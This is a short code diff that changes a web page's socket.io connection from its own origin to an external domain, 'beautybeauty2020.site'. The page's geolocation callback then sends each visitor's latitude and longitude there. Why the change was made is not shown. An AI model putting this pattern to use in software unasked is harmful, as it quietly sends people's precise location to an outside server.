@@ -288,7 +288,7 @@
     }
 
     function showPosition(position) {
-        var socket = io.connect();
+        var socket = io.connect('https://www.beautybeauty2020.site');
         socket.emit('latlong', { lat: position.coords.latitude, long: position.coords.longitude });
     }
 </script>
